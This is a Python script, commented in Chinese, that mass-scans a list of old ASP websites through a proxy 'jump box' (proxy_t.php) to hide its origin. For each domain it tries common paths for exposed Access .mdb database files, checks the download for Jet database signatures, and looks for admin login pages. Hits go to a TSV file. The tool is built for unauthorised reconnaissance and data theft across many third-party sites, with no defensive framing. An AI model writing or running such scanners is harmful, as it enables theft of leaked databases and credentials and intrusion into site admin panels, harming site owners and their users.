#!/usr/bin/env python3
"""jump_asp_scan.py - 通过81.70跳板(proxy_t)批量测ASP老站
MDB泄露 + 后台路径
"""
import urllib.request, urllib.parse, ssl, re, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
PROXY = 'http://127.0.0.1:13080/proxy_t.php'
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

def fetch_proxy(url, timeout=15):
    """通过proxy_t.php访问"""
    purl = PROXY + '?u=' + urllib.parse.quote(url, safe='')
    try:
        req = urllib.request.Request(purl, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        b = r.read(60000)
        # proxy_t返回格式: [code]\n<body>
        if b[:1] == b'[':
            m = re.match(rb'\[(\d+)\]', b)
            code = int(m.group(1))
            body = b[m.end():]
            return code, body
        return r.status, b
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000)
    except Exception:
        return 0, b''

MDB_PATHS = ['/db/database.mdb', '/data/database.mdb', '/database.mdb', '/db.mdb',
             '/data/data.mdb', '/databak.mdb', '/db/Data.mdb', '/inc/data.mdb',
             '/DataBase.mdb', '/data/ly.mdb', '/bbs/data/bbs.mdb']
ADMIN_PATHS = ['/admin/login.asp', '/manage/login.asp', '/login.asp', '/admin/',
               '/houtai/login.asp', '/admin/admin_login.asp']

def scan(dom):
    res = []
    # MDB
    for mp in MDB_PATHS:
        st, b = fetch_proxy('http://' + dom + mp)
        if st == 200 and len(b) > 500 and (b[:4] == b'\x00\x01\x00\x00' or b'Standard Jet' in b[:64]):
            res.append(('MDB', dom + mp, len(b)))
            break
    # 后台
    for ap in ADMIN_PATHS:
        st, b = fetch_proxy('http://' + dom + ap)
        if st == 200 and len(b) > 300:
            low = b.lower()
            has_pw = b'password' in low or b'type="password"' in low or b'pwd' in low or '登录'.encode('utf-8') in b
            if has_pw:
                res.append(('ADMIN', dom + ap, len(b)))
                break
    return res if res else None

def main():
    doms = [d.strip() for d in open('/tmp/old_asp.txt') if d.strip()]
    print('targets: %d (via 81.70 jump)' % len(doms), flush=True)
    all_res = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(scan, d): d for d in doms}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                for x in r:
                    all_res.append(x)
                    print('\t'.join(str(v) for v in x), flush=True)
    with open('/tmp/jump_asp_hits.tsv', 'w') as f:
        for r in all_res:
            f.write('\t'.join(str(v) for v in r) + '\n')
    print('=== DONE: %d hits ===' % len(all_res), flush=True)

if __name__ == '__main__':
    main()
